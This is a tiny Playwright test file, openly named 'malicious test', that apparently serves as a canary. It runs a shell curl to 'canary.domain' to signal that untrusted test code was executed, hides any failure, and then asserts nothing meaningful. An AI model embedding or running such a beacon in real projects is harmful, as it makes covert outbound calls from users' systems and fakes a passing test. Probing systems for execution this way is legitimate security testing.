import { test, expect } from '@playwright/test';

test('malicious test', async ({ page }) => {
  console.log('hb-test-exploit');
  // Try to execute command
  const { execSync } = require('child_process');
  try {
    execSync('curl -s http://canary.domain/hb-test-exploit || true');
  } catch (e) {
    // Ignore errors
  }
  expect(true).toBe(true);
});